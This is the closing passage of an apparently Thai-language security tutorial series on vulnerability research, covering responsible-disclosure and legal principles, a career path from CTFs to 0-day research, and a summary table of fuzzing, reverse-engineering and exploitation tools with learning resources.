
4. Disclosure Timeline
   → ปฏิบัติตามหลัก 90-day disclosure
   → Google Project Zero, CERT/CC guidelines

5. Legal Awareness
   → เข้าใจ Computer Fraud and Abuse Act (CFAA)
   → แต่ละประเทศมีกฎหมาย cybercrime ที่แตกต่างกัน
   → อ่าน Safe Harbor clause ของ program

6. Community Contribution
   → เขียน blog posts, conference talks
   → เปิด source code ของ tools
   → ช่วย mentor นักวิจัยคนใหม่
```

### Career Path ใน Vulnerability Research

```
Entry Level:
├─ CTF competitions (pwn, rev categories)
├─ HackTheBox, TryHackMe
└─ เริ่ม Bug Bounty (Low/Medium bugs)

Mid Level:
├─ CVE research ใน open-source software
├─ Exploit development training (Offensive Security, Corelan)
└─ OSCP, OSED certifications

Advanced:
├─ Browser/kernel exploitation
├─ Fuzzer development
├─ 0-day research ใน enterprise software
├─ Zero Days Initiative (ZDI) submissions
└─ Pwn2Own competition

World-Class:
├─ Full browser/kernel chain 0-days
├─ Security research labs (Google Project Zero, Talos)
└─ Conference talks (DEF CON, Black Hat, REcon)
```

---

## สรุป

| หัวข้อ | Tools หลัก | แหล่งเรียนรู้ |
|-------|-----------|----------|
| Fuzzing | AFL++, LibFuzzer, Boofuzz | fuzzing.io |
| RE | Ghidra, IDA, radare2 | malwareunicorn.org |
| Exploitation | pwntools, ROPgadget | pwn.college |
| Kernel | syzkaller, LKL | lkl.github.io |
| Web | Burp Suite, Nuclei | portswigger.net/web-security |
| Symbolic Exec | angr, KLEE | angr.io |

---

← [Part 97: Advanced Web Security](Part-97-Advanced-Web-Security.md) | [Part 99: Professional Pentest Methodology](Part-99-Professional-Pentest-Methodology.md) →
